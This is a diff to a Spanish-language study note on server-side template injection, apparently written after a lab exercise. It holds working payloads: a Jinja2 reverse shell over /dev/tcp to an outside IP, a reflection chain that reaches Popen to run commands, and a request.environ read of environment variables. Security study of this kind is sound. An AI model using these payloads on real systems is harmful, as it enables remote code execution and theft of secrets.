@@ -8,15 +8,42 @@ Por ejemplo, en un laboratorio que acabo de resolver, tras descubrir con `{{7*7}
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/192.168.1.157/443 0>&1'").read() }}
 ```
 
+```php
+{{8*'2'}} # Python: 22222222, PHP: 16
+{{8*2}} # Python: 16, PHP: 16
+```
+
 ## Metodología
 
 ![[SSTI-steps.png|373x384]]
 
-## Payloads 
+# Reflection
+Reflection es la habilidad de ciertos lenguajes de examinarse a si mismos (Python entre ellos), pudiendo listar sus propiedad y métodos y cambiando su estado interno.
+En python se puede hacer fetch a a un objeto con `__class__`, y se puede ver el padre de dicho objeto con `__base__`
+Se puede ir subiendo hasta el objetivo raíz encadenando `__base__`
+```python
+{{request.__class__.__base__.__base__.__base__<...>}}
+# Al llegar a object, el parent superior, se pued bajar de nuevo usando __subclasses__
+{{request.__class__.__base__.__base__.__subclasses__()}}
+# Al identificar una clase jugosa, como Popen, hay que identificar su ID (en este caso 282) para llamarla
+{{request.__class__.__base__.__base__.__subclasses__()[282]("env", shell=True,
+stdout=-1).communicate()[0]}}
+```
+
+# Payloads 
 En la mayoría de casos, este payload mostrará un error si es que la web es vulnerable a SSTI:
 ```
 ${{>%[%'"}}%\. 
 ```
+
+```python
+request.environ
+```
+> 	"Not to worry. There is a quick payload that works on both Flask
+	and Django Jinja2 templates, and it’s a good one: `request.environ`. In
+	both frameworks, this Python object holds information about the
+	current request: HTTP method, headers, user data, and, most
+	importantly, environment variables loaded by the app."
 ### Recursos
 [Demostración de Seven Seas Security](https://youtu.be/8o5QPU-BvFQ)
 [SSTImap](https://github.com/vladko312/SSTImap)
